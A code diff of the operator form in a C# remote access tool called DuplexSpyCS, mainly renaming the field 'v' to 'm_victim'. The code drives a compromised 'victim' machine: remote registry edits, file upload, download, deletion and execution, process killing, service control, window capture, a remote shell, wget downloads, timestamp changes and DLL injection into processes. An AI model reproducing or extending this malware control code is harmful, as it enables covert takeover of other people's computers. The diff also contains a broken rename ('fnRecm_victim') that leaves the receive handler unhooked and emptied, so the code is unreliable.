@@ -25,7 +25,7 @@ namespace DuplexSpyCS
 {
     public partial class frmManager : Form
     {
-        public clsVictim v { get; init; }
+        public clsVictim m_victim { get; init; }
         string current_path;
         frmWindowCapture f_winCap;
         private string file_homedir;
@@ -83,42 +83,16 @@ namespace DuplexSpyCS
         {
             InitializeComponent();
 
-            v = victim;
-            v.m_listener.ReceivedDecoded += fnRecv;
+            m_victim = victim;
+            //m_victim.m_listener.ReceivedDecoded += fnRecm_victim;
         }
 
         void fnRecv(clsListener listener, clsVictim victim, List<string> lsMsg)
         {
-            if (!clsTools.fnbVictimEquals(victim, v))
+            if (!clsTools.fnbVictimEquals(victim, m_victim))
                 return;
 
-            if (lsMsg[0] == "file")
-            {
-                if (lsMsg[1] == "init")
-                {
-
-                }
-                else if (lsMsg[1] == "sd")
-                {
-
-                }
-                else if (lsMsg[1] == "goto")
-                {
-
-                }
-            }
-            else if (lsMsg[0] == "task")
-            {
-
-            }
-            else if (lsMsg[0] == "service")
-            {
-
-            }
-            else if (lsMsg[0] == "window")
-            {
-
-            }
+            
         }
 
         #region Global Function
@@ -370,7 +344,7 @@ namespace DuplexSpyCS
         /// <param name="keyName">Key name of add.</param>
         public void Reg_ReqAddKey(string currentPath, string keyName)
         {
-            v.SendCommand($"reg|add|key|{clsCrypto.b64E2Str(currentPath)}|{clsCrypto.b64E2Str(keyName)}");
+            m_victim.SendCommand($"reg|add|key|{clsCrypto.b64E2Str(currentPath)}|{clsCrypto.b64E2Str(keyName)}");
         }
         public void Reg_RespAddKey(int code, string msg)
         {
@@ -389,7 +363,7 @@ namespace DuplexSpyCS
         /// <param name="kind"></param>
         public void Reg_ReqAddValue(string currentPath, string valName, string kind)
         {
-            v.SendCommand($"reg|add|val|{clsCrypto.b64E2Str(currentPath)}|{clsCrypto.b64E2Str(valName)}|{kind}");
+            m_victim.SendCommand($"reg|add|val|{clsCrypto.b64E2Str(currentPath)}|{clsCrypto.b64E2Str(valName)}|{kind}");
         }
 
         /// <summary>
@@ -434,7 +408,7 @@ namespace DuplexSpyCS
                     break;
             }
 
-            v.SendCommand($"reg|edit|{clsCrypto.b64E2Str(regFullPath)}|{clsCrypto.b64E2Str(valName)}|{valKind.ToString()}|{valPayload}");
+            m_victim.SendCommand($"reg|edit|{clsCrypto.b64E2Str(regFullPath)}|{clsCrypto.b64E2Str(valName)}|{valKind.ToString()}|{valPayload}");
         }
 
         /// <summary>
@@ -445,7 +419,7 @@ namespace DuplexSpyCS
         /// <param name="dstPath"></param>
         public void Reg_ReqKeyRename(string keyPath, string srcPath, string dstPath)
         {
-            v.SendCommand($"reg|rename|key|{clsCrypto.b64E2Str(keyPath)}|{clsCrypto.b64E2Str(srcPath)}|{clsCrypto.b64E2Str(dstPath)}");
+            m_victim.SendCommand($"reg|rename|key|{clsCrypto.b64E2Str(keyPath)}|{clsCrypto.b64E2Str(srcPath)}|{clsCrypto.b64E2Str(dstPath)}");
         }
 
         /// <summary>
@@ -464,14 +438,14 @@ namespace DuplexSpyCS
                         break;
                     case 1:
                         MessageBox.Show("Action successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                        ((frmRegKeyRename)clsTools.GetFormByVictim(v, Function.RegRenameKey)).Close();
+                        ((frmRegKeyRename)clsTools.GetFormByVictim(m_victim, Function.RegRenameKey)).Close();
                         break;
                 }
             }));
         }
         public void Reg_ReqValueRename(string currentPath, string originalName, string newName)
         {
-            v.SendCommand($"reg|rename|val|{clsCrypto.b64E2Str(originalName)}|{clsCrypto.b64E2Str(newName)}");
+            m_victim.SendCommand($"reg|rename|val|{clsCrypto.b64E2Str(originalName)}|{clsCrypto.b64E2Str(newName)}");
         }
         public void Reg_RespValueRename(int code, string msg)
         {
@@ -495,7 +469,7 @@ namespace DuplexSpyCS
         /// <param name="currentPath"></param>
         public void Reg_ReqKeyDelete(string currentPath)
         {
-            v.SendCommand($"reg|del|key|{clsCrypto.b64E2Str(currentPath)}");
+            m_victim.SendCommand($"reg|del|key|{clsCrypto.b64E2Str(currentPath)}");
         }
 
         /// <summary>
@@ -519,7 +493,7 @@ namespace DuplexSpyCS
         public void Reg_ReqValueDelete(string currentPath, string[] valNames)
         {
             string valNamePayload = string.Join(",", valNames.Select(x => clsCrypto.b64E2Str(x)).ToArray());
-            v.SendCommand($"reg|del|val|{clsCrypto.b64E2Str(currentPath)}|{valNamePayload}");
+            m_victim.SendCommand($"reg|del|val|{clsCrypto.b64E2Str(currentPath)}|{valNamePayload}");
         }
 
         /// <summary>
@@ -559,7 +533,7 @@ namespace DuplexSpyCS
             if (sfd.ShowDialog() == DialogResult.OK)
             {
                 string path = (string)textBox2.Tag;
-                v.encSend(2, 0, $@"reg|export|{clsCrypto.b64E2Str(path)}|{clsCrypto.b64E2Str(sfd.FileName)}");
+                m_victim.encSend(2, 0, $@"reg|export|{clsCrypto.b64E2Str(path)}|{clsCrypto.b64E2Str(sfd.FileName)}");
             }
         }
 
@@ -593,9 +567,9 @@ namespace DuplexSpyCS
         {
             frmRegFind f = new frmRegFind();
             f.currentPath = Reg_GetCurrentPath();
-            f.v = v;
+            f.v = m_victim;
             f.Tag = Function.RegFind;
-            f.Text = $@"RegFind\\{v.ID}";
+            f.Text = $@"RegFind\\{m_victim.ID}";
             f.Show();
         }
 
@@ -1086,7 +1060,7 @@ namespace DuplexSpyCS
             string path = clsCrypto.b64D2Str(d1);
             string text = clsCrypto.b64D2Str(d2);
 
-            frmTextEditor f_editor = (frmTextEditor)clsTools.GetFormByVictim(v, Function.TextEditor);
+            frmTextEditor f_editor = (frmTextEditor)clsTools.GetFormByVictim(m_victim, Function.TextEditor);
 
             if (f_editor == null || f_editor.IsDisposed)
             {
@@ -1094,8 +1068,8 @@ namespace DuplexSpyCS
                 {
                     f_editor = new frmTextEditor();
                     f_editor.Tag = Function.TextEditor;
-                    f_editor.v = v;
-                    f_editor.Text = $@"TextEditor\\{v.ID}";
+                    f_editor.v = m_victim;
+                    f_editor.Text = $@"TextEditor\\{m_victim.ID}";
                     f_editor.currentDir = (string)textBox1.Tag;
                     f_editor.Show();
                 }));
@@ -1115,7 +1089,7 @@ namespace DuplexSpyCS
             string msg = clsCrypto.b64D2Str(data);
             if (code == "1") //OK
             {
-                frmTextEditor f = (frmTextEditor)clsTools.GetFormByVictim(v, Function.TextEditor);
+                frmTextEditor f = (frmTextEditor)clsTools.GetFormByVictim(m_victim, Function.TextEditor);
                 if (f == null)
                     return;
 
@@ -1139,7 +1113,7 @@ namespace DuplexSpyCS
                 if (objs.Length == 2 && objs[1] == "f")
                 {
                     string path = objs[0];
-                    v.encSend(2, 0, $"file|read|" + clsCrypto.b64E2Str(path));
+                    m_victim.encSend(2, 0, $"file|read|" + clsCrypto.b64E2Str(path));
                 }
             }));
         }
@@ -1156,10 +1130,10 @@ namespace DuplexSpyCS
             {
                 f = new frmFileTransferState();
                 f.Tag = Function.TransferFileState;
-                f.v = v;
+                f.v = m_victim;
                 f.files = l_path.Select(x => Path.Combine(tgt_dir, Path.GetFileName(x[1]))).ToList();
                 f.transfer_type = TransferFileType.Upload;
-                f.Text = $@"File Transfer\\{v.ID}";
+                f.Text = $@"File Transfer\\{m_victim.ID}";
                 f.f_mgr = this;
                 Invoke(new Action(() =>
                 {
@@ -1210,7 +1184,7 @@ namespace DuplexSpyCS
 
                         buffer = buffer[0..byte_reads];
                         string b64_data = Convert.ToBase64String(buffer);
-                        v.encSend(2, 0, string.Join("|", new string[]
+                        m_victim.encSend(2, 0, string.Join("|", new string[]
                         {
                             "file",
                             "uf",
@@ -1238,10 +1212,10 @@ namespace DuplexSpyCS
         {
             frmFileTransferState f = new frmFileTransferState();
             f.Tag = Function.TransferFileState;
-            f.v = v;
+            f.v = m_victim;
             f.files = l_path.Select(x => x[1]).ToList();
             f.transfer_type = TransferFileType.Download;
-            f.Text = $@"File Transfer\\{v.ID}";
+            f.Text = $@"File Transfer\\{m_victim.ID}";
             f.f_mgr = this;
 
             if (actCompleted != null)
@@ -1255,7 +1229,7 @@ namespace DuplexSpyCS
                 .Select(x => clsCrypto.b64E2Str(x)).ToArray()
                 );
 
-            v.encSend(2, 0, "file|df|send|" + data);
+            m_victim.encSend(2, 0, "file|df|send|" + data);
         }
 
         /// <summary>
@@ -1281,19 +1255,19 @@ namespace DuplexSpyCS
 
                 }));
 
-                Form tmp = clsTools.GetFormByVictim(v, Function.FileImage);
+                Form tmp = clsTools.GetFormByVictim(m_victim, Function.FileImage);
                 frmFileShowImg f;
                 if (tmp == null)
                 {
                     f = new frmFileShowImg();
-                    f.Text = $@"File - Show Image\\{v.ID}";
+                    f.Text = $@"File - Show Image\\{m_victim.ID}";
                     f.Tag = Function.FileImage;
-                    f.v = v;
+                    f.v = m_victim;
                     f.m_nTotalImage = filename.Count;
                     Invoke(new Action(() => f.Show()));
                 }
 
-                v.encSend(2, 0, "file|img|" + string.Join(",", filename.ToArray()));
+                m_victim.encSend(2, 0, "file|img|" + string.Join(",", filename.ToArray()));
             }).Start();
         }
 
@@ -1304,7 +1278,7 @@ namespace DuplexSpyCS
         /// <param name="data">Image file with base-64 encoded.</param>
         public void File_ShowImage(string data)
         {
-            Form tmp = clsTools.GetFormByVictim(v, Function.FileImage);
+            Form tmp = clsTools.GetFormByVictim(m_victim, Function.FileImage);
             frmFileShowImg f;
             new Thread(() =>
             {
@@ -1314,8 +1288,8 @@ namespace DuplexSpyCS
                     {
                         f = new frmFileShowImg();
                         f.Tag = Function.FileImage;
-                        f.Text = @$"File - Show Image\\{v.ID}";
-                        f.v = v;
+                        f.Text = @$"File - Show Image\\{m_victim.ID}";
+                        f.v = m_victim;
                         Invoke(new Action(() => f.Show()));
                     }
                     else
@@ -1347,17 +1321,17 @@ namespace DuplexSpyCS
         /// <param name="folder">True: Folder; False: File</param>
         private void File_NewItem(bool folder)
         {
-            frmFileMgrNew f = (frmFileMgrNew)clsTools.GetFormByVictim(v, Function.FileNewItem);
+            frmFileMgrNew f = (frmFileMgrNew)clsTools.GetFormByVictim(m_victim, Function.FileNewItem);
             try
             {
                 if (f == null)
                 {
                     f = new frmFileMgrNew();
-                    f.v = v;
+                    f.v = m_victim;
                     f.folder = folder;
                     f.dir = textBox1.Tag.ToString();
                     f.Tag = Function.FileNewItem;
-                    f.Text = $@"New Item\\{v.ID}";
+                    f.Text = $@"New Item\\{m_victim.ID}";
                     f.Show();
                 }
                 else
@@ -1384,10 +1358,10 @@ namespace DuplexSpyCS
             frmFileDelState f = new frmFileDelState();
             f.l_folder = folders.ToList();
             f.l_file = files.ToList();
-            f.v = v;
+            f.v = m_victim;
             f.Tag = Function.FileDelState;
             f.f_mgr = this;
-            f.Text = $@"File Delete\\{v.ID}";
+            f.Text = $@"File Delete\\{m_victim.ID}";
             f.Show();
 
             folders = folders.Select(x => clsCrypto.b64E2Str(x)).ToArray();
@@ -1397,7 +1371,7 @@ namespace DuplexSpyCS
             if (dia == DialogResult.Yes)
             {
                 int thd_cnt = 10;
-                v.encSend(2, 0, $"file|del|{thd_cnt}|{string.Join(",", folders)}|{string.Join(",", files)}");
+                m_victim.encSend(2, 0, $"file|del|{thd_cnt}|{string.Join(",", folders)}|{string.Join(",", files)}");
             }
         }
 
@@ -1408,7 +1382,7 @@ namespace DuplexSpyCS
         /// <param name="d2">Folder state.</param>
         private void File_ShowDeleteState(string d1, string d2)
         {
-            frmFileDelState f = (frmFileDelState)clsTools.GetFormByVictim(v, Function.FileDelState);
+            frmFileDelState f = (frmFileDelState)clsTools.GetFormByVictim(m_victim, Function.FileDelState);
             if (f == null)
                 return;
 
@@ -1509,12 +1483,12 @@ namespace DuplexSpyCS
 
             frmFilePaste f = new frmFilePaste();
             f.Tag = Function.FilePaste;
-            f.v = v;
+            f.v = m_victim;
             f.f_mgr = this;
-            f.Text = @$"File Clipboard\\{v.ID}";
+            f.Text = @$"File Clipboard\\{m_victim.ID}";
             f.Show();
 
-            v.encSend(2, 0, $"file|paste|{type}|{string.Join(",", folders)}|{string.Join(",", files)}|{clsCrypto.b64E2Str(textBox1.Tag.ToString())}");
+            m_victim.encSend(2, 0, $"file|paste|{type}|{string.Join(",", folders)}|{string.Join(",", files)}|{clsCrypto.b64E2Str(textBox1.Tag.ToString())}");
         }
 
         /// <summary>
@@ -1532,7 +1506,7 @@ namespace DuplexSpyCS
                 f_limit = -1;
 
             listView1.Items.Clear();
-            v.encSend(2, 0, $"file|sd|{path}|{d_limit}|{f_limit}");
+            m_victim.encSend(2, 0, $"file|sd|{path}|{d_limit}|{f_limit}");
             toolStripStatusLabel2.Text = "Loading...";
         }
 
@@ -1576,11 +1550,11 @@ namespace DuplexSpyCS
 
             frmFileArchive f = new frmFileArchive();
             f.archiveAction = action;
-            f.v = v;
+            f.v = m_victim;
             f.lsEntries = lsEntries;
             f.currentPath = (string)textBox1.Tag;
             f.Tag = Function.FileArchive;
-            f.Text = $@"ZipFile\\{v.ID}";
+            f.Text = $@"ZipFile\\{m_victim.ID}";
             f.f_mgr = this;
             f.Show();
         }
@@ -1644,10 +1618,10 @@ namespace DuplexSpyCS
         public void File_FindStartup()
         {
             frmFileFind f = new frmFileFind();
-            f.v = v;
+            f.v = m_victim;
             f.currentPath = (string)textBox1.Tag;
             f.Tag = Function.FileFind;
-            f.Text = $@"FileFind\\{v.ID}";
+            f.Text = $@"FileFind\\{m_victim.ID}";
             f.Show();
         }
 
@@ -1659,7 +1633,7 @@ namespace DuplexSpyCS
                 return;
             }
 
-            frmFileWGET f = (frmFileWGET)clsTools.GetFormByVictim(v, Function.FileWGET);
+            frmFileWGET f = (frmFileWGET)clsTools.GetFormByVictim(m_victim, Function.FileWGET);
             if (f == null)
                 return;
 
@@ -1684,7 +1658,7 @@ namespace DuplexSpyCS
             listView5.Items.Clear();
             treeView4.Nodes.Clear();
 
-            v.encSend(2, 0, $"window|init");
+            m_victim.encSend(2, 0, $"window|init");
 
             toolStripStatusLabel6.Text = "Loading...";
         }
@@ -1753,7 +1727,7 @@ namespace DuplexSpyCS
                         f_winCap = new frmWindowCapture();
                         f_winCap.Text = "Window Capture";
                         f_winCap.StartPosition = FormStartPosition.CenterScreen;
-                        f_winCap.v = v;
+                        f_winCap.v = m_victim;
                         f_winCap.Show();
                     }
 
@@ -1776,7 +1750,7 @@ namespace DuplexSpyCS
             listView2.Items.Clear();
             treeView2.Nodes.Clear();
 
-            v.encSend(2, 0, $"task|init|{clsCrypto.b64E2Str($"select {string.Join(",", dic_fields["task"])} from win32_process")}");
+            m_victim.encSend(2, 0, $"task|init|{clsCrypto.b64E2Str($"select {string.Join(",", dic_fields["task"])} from win32_process")}");
         }
         /// <summary>
         /// "TaskMgr" function initialization.
@@ -1859,7 +1833,7 @@ namespace DuplexSpyCS
             if (msg != DialogResult.Yes)
                 return;
 
-            v.encSend(2, 0, "task|kill|" + string.Join(",", id_tasks));
+            m_victim.encSend(2, 0, "task|kill|" + string.Join(",", id_tasks));
         }
         /// <summary>
         /// Send kill and delete process command request with process id.
@@ -1867,7 +1841,7 @@ namespace DuplexSpyCS
         private void Task_SendKillAndDelete()
         {
             string[] id_tasks = listView2.SelectedItems.Cast<ListViewItem>().Select(x => x.SubItems[1].Text).ToArray();
-            v.encSend(2, 0, "task|kd|" + string.Join(",", id_tasks));
+            m_victim.encSend(2, 0, "task|kd|" + string.Join(",", id_tasks));
         }
         /// <summary>
         /// Send start process command request.
@@ -1919,7 +1893,7 @@ namespace DuplexSpyCS
             listView3.Items.Clear();
             richTextBox1.Text = string.Empty;
 
-            v.encSend(2, 0, $"serv|init|{clsCrypto.b64E2Str($"select {string.Join(",", dic_fields["serv"])} from win32_service")}");
+            m_victim.encSend(2, 0, $"serv|init|{clsCrypto.b64E2Str($"select {string.Join(",", dic_fields["serv"])} from win32_service")}");
         }
         /// <summary>
         /// "Service" function initialization.
@@ -1977,17 +1951,17 @@ namespace DuplexSpyCS
             //TRUE: START; FALSE: STOP
 
             string[] names = Serv_GetNames();
-            v.encSend(2, 0, $"serv|control|{names}|{(start ? "Running" : "Stopped")}");
+            m_victim.encSend(2, 0, $"serv|control|{names}|{(start ? "Running" : "Stopped")}");
         }
         private void Serv_ReqPause()
         {
             string[] names = Serv_GetNames();
-            v.encSend(2, 0, $"serv|control|{names}|Paused");
+            m_victim.encSend(2, 0, $"serv|control|{names}|Paused");
         }
         private void Serv_ReqRestart()
         {
             string[] names = Serv_GetNames();
-            v.encSend(2, 0, $"serv|control|{names}|restart");
+            m_victim.encSend(2, 0, $"serv|control|{names}|restart");
         }
         private void Serv_RegexSearch(string szPattern)
         {
@@ -2017,7 +1991,7 @@ namespace DuplexSpyCS
 
         private void Conn_ReqInit()
         {
-            v.encSend(2, 0, $"conn|init");
+            m_victim.encSend(2, 0, $"conn|init");
         }
         /// <summary>
         /// "Connection" function initalization.
@@ -2074,10 +2048,10 @@ namespace DuplexSpyCS
                 "user",
             };
 
-            v.encSend(2, 0, $"file|init|{200}|{200}");
-            //v.encSend(2, 0, $"task|init|{Crypto.b64E2Str($"select {string.Join(",", dic_fields["task"])} from win32_process")}");
+            m_victim.encSend(2, 0, $"file|init|{200}|{200}");
+            //m_victim.encSend(2, 0, $"task|init|{clsCrypto.b64E2Str($"select {string.Join(",", dic_fields["task"])} from win32_process")}");
             Task_ReqInit();
-            v.encSend(2, 0, $"reg|init");
+            m_victim.encSend(2, 0, $"reg|init");
             Conn_ReqInit();
             Serv_ReqInit();
             Window_ReqInit();
@@ -2113,7 +2087,7 @@ namespace DuplexSpyCS
         {
             if (e.KeyCode == Keys.Enter)
             {
-                v.SendCommand($"file|goto|{clsCrypto.b64E2Str(textBox1.Text)}");
+                m_victim.SendCommand($"file|goto|{clsCrypto.b64E2Str(textBox1.Text)}");
             }
         }
 
@@ -2132,7 +2106,7 @@ namespace DuplexSpyCS
                 string[] s = node.FullPath.Split("\\");
                 string root = s[1];
                 string node_path = string.Join("\\", s[2..]);
-                v.encSend(2, 0, $"reg|item|{root}|" + clsCrypto.b64E2Str(node_path));
+                m_victim.encSend(2, 0, $"reg|item|{root}|" + clsCrypto.b64E2Str(node_path));
             }
             catch (Exception ex)
             {
@@ -2148,7 +2122,7 @@ namespace DuplexSpyCS
                 string[] s = path.Split("\\");
                 string root = s[1];
                 path = string.Join("\\", s[2..]);
-                v.encSend(2, 0, $"reg|goto|{root}|{clsCrypto.b64E2Str(path)}");
+                m_victim.encSend(2, 0, $"reg|goto|{root}|{clsCrypto.b64E2Str(path)}");
             }
         }
 
@@ -2192,7 +2166,7 @@ namespace DuplexSpyCS
                 .ToArray()
                 );
 
-            v.encSend(2, 0, "file|img|" + files);
+            m_victim.encSend(2, 0, "file|img|" + files);
         }
 
         private void toolStripMenuItem2_Click(object sender, EventArgs e)
@@ -2337,7 +2311,7 @@ namespace DuplexSpyCS
         private void toolStripButton3_Click(object sender, EventArgs e)
         {
             frmFileMgrExec f = new frmFileMgrExec();
-            f.v = v;
+            f.v = m_victim;
 
             if (listView1.SelectedItems.Count > 0)
                 f.szRemoteExecutable = listView1.SelectedItems[0].Text;
@@ -2350,13 +2324,13 @@ namespace DuplexSpyCS
         //OPEN SHELL IN CURRENT DIRECTORY
         private void toolStripButton4_Click(object sender, EventArgs e)
         {
-            frmShell f = (frmShell)clsTools.GetFormByVictim(v, Function.Shell);
+            frmShell f = (frmShell)clsTools.GetFormByVictim(m_victim, Function.Shell);
             if (f == null)
                 f = new frmShell(current_path);
-            f.v = v;
+            f.v = m_victim;
             f.Tag = Function.Shell;
             f.StartPosition = FormStartPosition.CenterScreen;
-            f.Text = $@"Shell\\{v.ID}";
+            f.Text = $@"Shell\\{m_victim.ID}";
             f.Show();
         }
 
@@ -2441,19 +2415,19 @@ namespace DuplexSpyCS
         private void toolStripMenuItem9_Click(object sender, EventArgs e)
         {
             string[] pids = listView2.SelectedItems.Cast<ListViewItem>().Select(x => x.SubItems[1].Text).ToArray();
-            v.SendCommand($"task|kill|{string.Join(",", pids)}");
+            m_victim.SendCommand($"task|kill|{string.Join(",", pids)}");
         }
         //TASK - KILL & DELETE
         private void toolStripMenuItem10_Click(object sender, EventArgs e)
         {
             string[] pids = listView2.SelectedItems.Cast<ListViewItem>().Select(x => x.SubItems[1].Text).ToArray();
-            v.SendCommand($"task|kd|{string.Join(",", pids)}");
+            m_victim.SendCommand($"task|kd|{string.Join(",", pids)}");
         }
         //TASK - Resume
         private void toolStripMenuItem11_Click(object sender, EventArgs e)
         {
             string[] pids = listView2.SelectedItems.Cast<ListViewItem>().Select(x => x.SubItems[1].Text).ToArray();
-            v.SendCommand($"task|resume|{string.Join(",", pids)}");
+            m_victim.SendCommand($"task|resume|{string.Join(",", pids)}");
         }
 
         //FILE - NEW FOLDER
@@ -2591,35 +2565,35 @@ namespace DuplexSpyCS
         {
             string[] names = listView3.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToArray();
             string b64Names = string.Join(",", names.Select(x => clsCrypto.b64E2Str(x)).ToArray());
-            v.encSend(2, 0, $"serv|control|{b64Names}|Running");
+            m_victim.encSend(2, 0, $"serv|control|{b64Names}|Running");
         }
         //SERVICE - STOP
         private void toolStripMenuItem13_Click(object sender, EventArgs e)
         {
             string[] names = listView3.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToArray();
             string b64Names = string.Join(",", names.Select(x => clsCrypto.b64E2Str(x)).ToArray());
-            v.encSend(2, 0, $"serv|control|{b64Names}|Stopped");
+            m_victim.encSend(2, 0, $"serv|control|{b64Names}|Stopped");
         }
         //SERVICE - PAUSE
         private void toolStripMenuItem12_Click(object sender, EventArgs e)
         {
             string[] names = listView3.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToArray();
             string b64Names = string.Join(",", names.Select(x => clsCrypto.b64E2Str(x)).ToArray());
-            v.encSend(2, 0, $"serv|control|{b64Names}|Paused");
+            m_victim.encSend(2, 0, $"serv|control|{b64Names}|Paused");
         }
         //SERVICE - RESUME
         private void toolStripMenuItem31_Click(object sender, EventArgs e)
         {
             string[] names = listView3.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToArray();
             string b64Names = string.Join(",", names.Select(x => clsCrypto.b64E2Str(x)).ToArray());
-            v.encSend(2, 0, $"serv|control|{b64Names}|Running");
+            m_victim.encSend(2, 0, $"serv|control|{b64Names}|Running");
         }
         //SERVICE - RESTART
         private void toolStripMenuItem32_Click(object sender, EventArgs e)
         {
             string[] names = listView3.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToArray();
             string b64Names = string.Join(",", names.Select(x => clsCrypto.b64E2Str(x)).ToArray());
-            v.encSend(2, 0, $"serv|control|{b64Names}|restart");
+            m_victim.encSend(2, 0, $"serv|control|{b64Names}|restart");
         }
 
         private void treeView6_AfterSelect(object sender, TreeViewEventArgs e)
@@ -2631,7 +2605,7 @@ namespace DuplexSpyCS
         {
             frmFileMgrExec f = new frmFileMgrExec();
             f.Text = "Start";
-            f.v = v;
+            f.v = m_victim;
             f.szCurrentDir = File_GetCurrentPath();
             f.ShowDialog();
         }
@@ -2649,9 +2623,9 @@ namespace DuplexSpyCS
             frmRegAddKey f = new frmRegAddKey();
             f.f_mgr = this;
             f.currentPath = (string)textBox2.Tag;
-            f.v = v;
+            f.v = m_victim;
             f.Tag = Function.RegAddKey;
-            f.Text = $@"Reg Add Key\\{v.ID}";
+            f.Text = $@"Reg Add Key\\{m_victim.ID}";
 
             f.ShowDialog();
         }
@@ -2664,13 +2638,13 @@ namespace DuplexSpyCS
                 return;
 
             frmRegKeyRename f = new frmRegKeyRename();
-            f.Text = $@"Reg Rename\\{v.ID}";
+            f.Text = $@"Reg Rename\\{m_victim.ID}";
             f.f_mgr = this;
             f.keyName = selectedNode.Text;
             f.currentPath = selectedNode.Parent.FullPath;
-            f.v = v;
+            f.v = m_victim;
             f.Tag = Function.RegRenameKey;
-            f.Text = $@"Reg Rename Key\\{v.ID}";
+            f.Text = $@"Reg Rename Key\\{m_victim.ID}";
 
             f.ShowDialog();
         }
@@ -2701,11 +2675,11 @@ namespace DuplexSpyCS
         private void toolStripMenuItem39_Click(object sender, EventArgs e)
         {
             frmRegValAdd f = new frmRegValAdd();
-            f.v = v;
+            f.v = m_victim;
             f.Tag = Function.RegAddValue;
             f.f_mgr = this;
             f.currentPath = (string)textBox2.Tag;
-            f.Text = $@"Reg Add Value\\{v.ID}";
+            f.Text = $@"Reg Add Value\\{m_victim.ID}";
 
             f.ShowDialog();
         }
@@ -2723,12 +2697,12 @@ namespace DuplexSpyCS
             ListViewItem item = listView6.SelectedItems[0];
 
             frmRegValRename f = new frmRegValRename();
-            f.v = v;
+            f.v = m_victim;
             f.Tag = Function.RegRenameValue;
             f.f_mgr = this;
             f.currentPath = (string)textBox2.Tag;
             f.oldName = item.Text;
-            f.Text = $@"Reg Rename Value\\{v.ID}";
+            f.Text = $@"Reg Rename Value\\{m_victim.ID}";
             f.ShowDialog();
         }
         //Reg - Delete Val
@@ -2789,7 +2763,7 @@ namespace DuplexSpyCS
         {
             foreach (ListViewItem item in listView2.SelectedItems)
             {
-                frmTaskDLLInjector f = new frmTaskDLLInjector(v, int.Parse(item.SubItems[1].Text));
+                frmTaskDLLInjector f = new frmTaskDLLInjector(m_victim, int.Parse(item.SubItems[1].Text));
                 f.Show();
             }
         }
@@ -2871,7 +2845,7 @@ namespace DuplexSpyCS
         private void toolStripMenuItem48_Click(object sender, EventArgs e)
         {
             string[] pids = listView2.SelectedItems.Cast<ListViewItem>().Select(x => x.SubItems[1].Text).ToArray();
-            v.SendCommand($"task|suspend|{string.Join(",", pids)}");
+            m_victim.SendCommand($"task|suspend|{string.Join(",", pids)}");
         }
 
         private void toolStripMenuItem49_Click(object sender, EventArgs e)
@@ -3014,13 +2988,13 @@ namespace DuplexSpyCS
         private void toolStripMenuItem52_Click(object sender, EventArgs e)
         {
             ListViewItem item = listView5.SelectedItems[0];
-            v.SendCommand($"window|shot|api|{item.SubItems[4].Text}");
+            m_victim.SendCommand($"window|shot|api|{item.SubItems[4].Text}");
         }
         //Capture - SetForeground
         private void toolStripMenuItem53_Click(object sender, EventArgs e)
         {
             ListViewItem item = listView5.SelectedItems[0];
-            v.SendCommand($"window|shot|fore|{item.SubItems[4].Text}");
+            m_victim.SendCommand($"window|shot|fore|{item.SubItems[4].Text}");
         }
 
         private void listView5_KeyDown(object sender, KeyEventArgs e)
@@ -3042,10 +3016,10 @@ namespace DuplexSpyCS
         private void toolStripMenuItem59_Click(object sender, EventArgs e)
         {
             frmFileWGET f = new frmFileWGET();
-            f.v = v;
+            f.v = m_victim;
             f.szCurrentDir = File_GetCurrentPath();
             f.Tag = Function.FileWGET;
-            f.Text = @$"Wget\\{v.ID}";
+            f.Text = @$"Wget\\{m_victim.ID}";
 
             f.Show();
         }
@@ -3145,7 +3119,7 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in listView5.SelectedItems)
             {
                 int nHandle = int.Parse(item.SubItems[3].Text);
-                v.SendCommand($"thread|suspend|{nHandle}");
+                m_victim.SendCommand($"thread|suspend|{nHandle}");
             }
         }
         //Window - thread resume
@@ -3154,7 +3128,7 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in listView5.SelectedItems)
             {
                 int nHandle = int.Parse(item.SubItems[3].Text);
-                v.SendCommand($"thread|resume|{nHandle}");
+                m_victim.SendCommand($"thread|resume|{nHandle}");
             }
         }
 
@@ -3169,7 +3143,7 @@ namespace DuplexSpyCS
                 bool bFile = fnItemIsFile(item);
                 string szFileName = item.Text;
 
-                frmFileDatetime f = new frmFileDatetime(v, szCurrentPath, szFileName, bFile);
+                frmFileDatetime f = new frmFileDatetime(m_victim, szCurrentPath, szFileName, bFile);
                 f.Show();
             }
         }
@@ -3194,7 +3168,7 @@ namespace DuplexSpyCS
             else if (lPath.Count > 1)
                 MessageBox.Show("More then one file, this tool will choose the first file automatically.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
 
-            frmFileShortCut f = new frmFileShortCut(v, File_GetCurrentPath(), lPath[0]);
+            frmFileShortCut f = new frmFileShortCut(m_victim, File_GetCurrentPath(), lPath[0]);
             f.Text = "Create ShortCut";
 
             f.Show();
@@ -3202,7 +3176,7 @@ namespace DuplexSpyCS
 
         private void frmManager_FormClosed(object sender, FormClosedEventArgs e)
         {
-            v.m_listener.ReceivedDecoded -= fnRecv;
+            //m_victim.m_listener.ReceivedDecoded -= fnRecm_victim;
         }
     }
 }
